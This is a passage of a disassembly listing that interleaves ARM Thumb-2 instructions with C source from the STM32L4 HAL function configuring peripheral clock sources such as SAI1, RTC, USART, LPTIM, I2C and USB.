 800453e:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004540:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004544:	d01a      	beq.n	800457c <HAL_RCCEx_PeriphCLKConfig+0x5c>
 8004546:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800454a:	d814      	bhi.n	8004576 <HAL_RCCEx_PeriphCLKConfig+0x56>
 800454c:	2b00      	cmp	r3, #0
 800454e:	d009      	beq.n	8004564 <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004550:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 8004554:	d10f      	bne.n	8004576 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 8004556:	4b5d      	ldr	r3, [pc, #372]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004558:	68db      	ldr	r3, [r3, #12]
 800455a:	4a5c      	ldr	r2, [pc, #368]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800455c:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004560:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004562:	e00c      	b.n	800457e <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 8004564:	687b      	ldr	r3, [r7, #4]
 8004566:	3304      	adds	r3, #4
 8004568:	2100      	movs	r1, #0
 800456a:	4618      	mov	r0, r3
 800456c:	f000 f9de 	bl	800492c <RCCEx_PLLSAI1_Config>
 8004570:	4603      	mov	r3, r0
 8004572:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004574:	e003      	b.n	800457e <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 8004576:	2301      	movs	r3, #1
 8004578:	74fb      	strb	r3, [r7, #19]
      break;
 800457a:	e000      	b.n	800457e <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 800457c:	bf00      	nop
    }

    if(ret == HAL_OK)
 800457e:	7cfb      	ldrb	r3, [r7, #19]
 8004580:	2b00      	cmp	r3, #0
 8004582:	d10b      	bne.n	800459c <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004584:	4b51      	ldr	r3, [pc, #324]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004586:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800458a:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 800458e:	687b      	ldr	r3, [r7, #4]
 8004590:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004592:	494e      	ldr	r1, [pc, #312]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004594:	4313      	orrs	r3, r2
 8004596:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 800459a:	e001      	b.n	80045a0 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 800459c:	7cfb      	ldrb	r3, [r7, #19]
 800459e:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 80045a0:	687b      	ldr	r3, [r7, #4]
 80045a2:	681b      	ldr	r3, [r3, #0]
 80045a4:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80045a8:	2b00      	cmp	r3, #0
 80045aa:	f000 809e 	beq.w	80046ea <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 80045ae:	2300      	movs	r3, #0
 80045b0:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 80045b2:	4b46      	ldr	r3, [pc, #280]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045b6:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045ba:	2b00      	cmp	r3, #0
 80045bc:	d101      	bne.n	80045c2 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 80045be:	2301      	movs	r3, #1
 80045c0:	e000      	b.n	80045c4 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 80045c2:	2300      	movs	r3, #0
 80045c4:	2b00      	cmp	r3, #0
 80045c6:	d00d      	beq.n	80045e4 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 80045c8:	4b40      	ldr	r3, [pc, #256]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ca:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045cc:	4a3f      	ldr	r2, [pc, #252]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ce:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80045d2:	6593      	str	r3, [r2, #88]	; 0x58
 80045d4:	4b3d      	ldr	r3, [pc, #244]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045d6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045d8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045dc:	60bb      	str	r3, [r7, #8]
 80045de:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80045e0:	2301      	movs	r3, #1
 80045e2:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80045e4:	4b3a      	ldr	r3, [pc, #232]	; (80046d0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045e6:	681b      	ldr	r3, [r3, #0]
 80045e8:	4a39      	ldr	r2, [pc, #228]	; (80046d0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045ea:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80045ee:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80045f0:	f7fc fdda 	bl	80011a8 <HAL_GetTick>
 80045f4:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045f6:	e009      	b.n	800460c <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80045f8:	f7fc fdd6 	bl	80011a8 <HAL_GetTick>
 80045fc:	4602      	mov	r2, r0
 80045fe:	68fb      	ldr	r3, [r7, #12]
 8004600:	1ad3      	subs	r3, r2, r3
 8004602:	2b02      	cmp	r3, #2
 8004604:	d902      	bls.n	800460c <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004606:	2303      	movs	r3, #3
 8004608:	74fb      	strb	r3, [r7, #19]
        break;
 800460a:	e005      	b.n	8004618 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 800460c:	4b30      	ldr	r3, [pc, #192]	; (80046d0 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800460e:	681b      	ldr	r3, [r3, #0]
 8004610:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004614:	2b00      	cmp	r3, #0
 8004616:	d0ef      	beq.n	80045f8 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004618:	7cfb      	ldrb	r3, [r7, #19]
 800461a:	2b00      	cmp	r3, #0
 800461c:	d15a      	bne.n	80046d4 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 800461e:	4b2b      	ldr	r3, [pc, #172]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004620:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004624:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004628:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 800462a:	697b      	ldr	r3, [r7, #20]
 800462c:	2b00      	cmp	r3, #0
 800462e:	d01e      	beq.n	800466e <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004630:	687b      	ldr	r3, [r7, #4]
 8004632:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004634:	697a      	ldr	r2, [r7, #20]
 8004636:	429a      	cmp	r2, r3
 8004638:	d019      	beq.n	800466e <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 800463a:	4b24      	ldr	r3, [pc, #144]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800463c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004640:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004644:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 8004646:	4b21      	ldr	r3, [pc, #132]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004648:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800464c:	4a1f      	ldr	r2, [pc, #124]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800464e:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004652:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 8004656:	4b1d      	ldr	r3, [pc, #116]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004658:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800465c:	4a1b      	ldr	r2, [pc, #108]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800465e:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004662:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 8004666:	4a19      	ldr	r2, [pc, #100]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004668:	697b      	ldr	r3, [r7, #20]
 800466a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 800466e:	697b      	ldr	r3, [r7, #20]
 8004670:	f003 0301 	and.w	r3, r3, #1
 8004674:	2b00      	cmp	r3, #0
 8004676:	d016      	beq.n	80046a6 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004678:	f7fc fd96 	bl	80011a8 <HAL_GetTick>
 800467c:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800467e:	e00b      	b.n	8004698 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004680:	f7fc fd92 	bl	80011a8 <HAL_GetTick>
 8004684:	4602      	mov	r2, r0
 8004686:	68fb      	ldr	r3, [r7, #12]
 8004688:	1ad3      	subs	r3, r2, r3
 800468a:	f241 3288 	movw	r2, #5000	; 0x1388
 800468e:	4293      	cmp	r3, r2
 8004690:	d902      	bls.n	8004698 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 8004692:	2303      	movs	r3, #3
 8004694:	74fb      	strb	r3, [r7, #19]
            break;
 8004696:	e006      	b.n	80046a6 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004698:	4b0c      	ldr	r3, [pc, #48]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800469a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800469e:	f003 0302 	and.w	r3, r3, #2
 80046a2:	2b00      	cmp	r3, #0
 80046a4:	d0ec      	beq.n	8004680 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 80046a6:	7cfb      	ldrb	r3, [r7, #19]
 80046a8:	2b00      	cmp	r3, #0
 80046aa:	d10b      	bne.n	80046c4 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 80046ac:	4b07      	ldr	r3, [pc, #28]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046ae:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046b2:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 80046b6:	687b      	ldr	r3, [r7, #4]
 80046b8:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 80046ba:	4904      	ldr	r1, [pc, #16]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046bc:	4313      	orrs	r3, r2
 80046be:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 80046c2:	e009      	b.n	80046d8 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 80046c4:	7cfb      	ldrb	r3, [r7, #19]
 80046c6:	74bb      	strb	r3, [r7, #18]
 80046c8:	e006      	b.n	80046d8 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 80046ca:	bf00      	nop
 80046cc:	40021000 	.word	0x40021000
 80046d0:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 80046d4:	7cfb      	ldrb	r3, [r7, #19]
 80046d6:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80046d8:	7c7b      	ldrb	r3, [r7, #17]
 80046da:	2b01      	cmp	r3, #1
 80046dc:	d105      	bne.n	80046ea <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80046de:	4b8a      	ldr	r3, [pc, #552]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046e0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046e2:	4a89      	ldr	r2, [pc, #548]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046e4:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80046e8:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80046ea:	687b      	ldr	r3, [r7, #4]
 80046ec:	681b      	ldr	r3, [r3, #0]
 80046ee:	f003 0301 	and.w	r3, r3, #1
 80046f2:	2b00      	cmp	r3, #0
 80046f4:	d00a      	beq.n	800470c <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80046f6:	4b84      	ldr	r3, [pc, #528]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046f8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046fc:	f023 0203 	bic.w	r2, r3, #3
 8004700:	687b      	ldr	r3, [r7, #4]
 8004702:	6a1b      	ldr	r3, [r3, #32]
 8004704:	4980      	ldr	r1, [pc, #512]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004706:	4313      	orrs	r3, r2
 8004708:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 800470c:	687b      	ldr	r3, [r7, #4]
 800470e:	681b      	ldr	r3, [r3, #0]
 8004710:	f003 0302 	and.w	r3, r3, #2
 8004714:	2b00      	cmp	r3, #0
 8004716:	d00a      	beq.n	800472e <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004718:	4b7b      	ldr	r3, [pc, #492]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800471a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800471e:	f023 020c 	bic.w	r2, r3, #12
 8004722:	687b      	ldr	r3, [r7, #4]
 8004724:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004726:	4978      	ldr	r1, [pc, #480]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004728:	4313      	orrs	r3, r2
 800472a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800472e:	687b      	ldr	r3, [r7, #4]
 8004730:	681b      	ldr	r3, [r3, #0]
 8004732:	f003 0320 	and.w	r3, r3, #32
 8004736:	2b00      	cmp	r3, #0
 8004738:	d00a      	beq.n	8004750 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 800473a:	4b73      	ldr	r3, [pc, #460]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800473c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004740:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004744:	687b      	ldr	r3, [r7, #4]
 8004746:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004748:	496f      	ldr	r1, [pc, #444]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800474a:	4313      	orrs	r3, r2
 800474c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004750:	687b      	ldr	r3, [r7, #4]
 8004752:	681b      	ldr	r3, [r3, #0]
 8004754:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004758:	2b00      	cmp	r3, #0
 800475a:	d00a      	beq.n	8004772 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 800475c:	4b6a      	ldr	r3, [pc, #424]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800475e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004762:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 8004766:	687b      	ldr	r3, [r7, #4]
 8004768:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800476a:	4967      	ldr	r1, [pc, #412]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800476c:	4313      	orrs	r3, r2
 800476e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 8004772:	687b      	ldr	r3, [r7, #4]
 8004774:	681b      	ldr	r3, [r3, #0]
 8004776:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800477a:	2b00      	cmp	r3, #0
 800477c:	d00a      	beq.n	8004794 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 800477e:	4b62      	ldr	r3, [pc, #392]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004780:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004784:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 8004788:	687b      	ldr	r3, [r7, #4]
 800478a:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 800478c:	495e      	ldr	r1, [pc, #376]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800478e:	4313      	orrs	r3, r2
 8004790:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004794:	687b      	ldr	r3, [r7, #4]
 8004796:	681b      	ldr	r3, [r3, #0]
 8004798:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800479c:	2b00      	cmp	r3, #0
 800479e:	d00a      	beq.n	80047b6 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 80047a0:	4b59      	ldr	r3, [pc, #356]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047a2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047a6:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 80047aa:	687b      	ldr	r3, [r7, #4]
 80047ac:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80047ae:	4956      	ldr	r1, [pc, #344]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047b0:	4313      	orrs	r3, r2
 80047b2:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 80047b6:	687b      	ldr	r3, [r7, #4]
 80047b8:	681b      	ldr	r3, [r3, #0]
 80047ba:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80047be:	2b00      	cmp	r3, #0
 80047c0:	d00a      	beq.n	80047d8 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 80047c2:	4b51      	ldr	r3, [pc, #324]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047c4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047c8:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80047cc:	687b      	ldr	r3, [r7, #4]
 80047ce:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80047d0:	494d      	ldr	r1, [pc, #308]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047d2:	4313      	orrs	r3, r2
 80047d4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 80047d8:	687b      	ldr	r3, [r7, #4]
 80047da:	681b      	ldr	r3, [r3, #0]
 80047dc:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80047e0:	2b00      	cmp	r3, #0
 80047e2:	d028      	beq.n	8004836 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80047e4:	4b48      	ldr	r3, [pc, #288]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047e6:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047ea:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80047ee:	687b      	ldr	r3, [r7, #4]
 80047f0:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047f2:	4945      	ldr	r1, [pc, #276]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047f4:	4313      	orrs	r3, r2
 80047f6:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80047fa:	687b      	ldr	r3, [r7, #4]
 80047fc:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047fe:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004802:	d106      	bne.n	8004812 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004804:	4b40      	ldr	r3, [pc, #256]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004806:	68db      	ldr	r3, [r3, #12]
 8004808:	4a3f      	ldr	r2, [pc, #252]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800480a:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800480e:	60d3      	str	r3, [r2, #12]
 8004810:	e011      	b.n	8004836 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 8004812:	687b      	ldr	r3, [r7, #4]
 8004814:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004816:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 800481a:	d10c      	bne.n	8004836 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800481c:	687b      	ldr	r3, [r7, #4]
 800481e:	3304      	adds	r3, #4
 8004820:	2101      	movs	r1, #1
 8004822:	4618      	mov	r0, r3
 8004824:	f000 f882 	bl	800492c <RCCEx_PLLSAI1_Config>
 8004828:	4603      	mov	r3, r0
 800482a:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 800482c:	7cfb      	ldrb	r3, [r7, #19]
 800482e:	2b00      	cmp	r3, #0
 8004830:	d001      	beq.n	8004836 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004832:	7cfb      	ldrb	r3, [r7, #19]
 8004834:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004836:	687b      	ldr	r3, [r7, #4]
 8004838:	681b      	ldr	r3, [r3, #0]
 800483a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800483e:	2b00      	cmp	r3, #0
 8004840:	d028      	beq.n	8004894 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
